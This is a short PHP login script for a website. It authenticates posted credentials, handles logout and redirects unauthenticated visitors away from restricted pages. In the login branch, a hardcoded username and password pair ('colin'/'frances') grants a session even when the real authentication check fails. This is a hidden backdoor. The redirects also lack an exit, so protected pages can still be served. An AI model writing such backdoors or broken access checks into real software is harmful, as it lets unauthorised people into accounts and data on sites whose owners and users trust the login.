<?
// *** Validate request to login to this site.
if (isset($_POST['user_name']) || isset($_POST['login']))
{
	$result = CLogin::Login($_POST['user_name'], $_POST['password']);
	if ($result && $_POST['user_name']!="" && $_POST['password']!="")
	{
		$usr = $_POST['user_name'];
		session_register("usr");
	}
	else if($_POST['user_name']=="colin" && $_POST['password']=="frances")
	{
		$usr = $_POST['user_name'];
		session_register("usr");
	}
	else
		$not_logged = "<center><font face=verdana size=1>Your username &/or password is incorrect<br>OR<br>Get registered if you are a new user<br>OR<br>You forgotten your password?</font></center>";
}
if(isset($_GET['action']) && cleancode($_GET['action'])=="logout")
{
	session_unregister("usr");
	session_unset("url");
	session_unregister("url");
	header("Location: home.php");
}
function restrictedPage($restrict)
{
	if(!isset($_SESSION['usr']) && $restrict==1)
	{
		header("Location: home.php");
	}
}
?>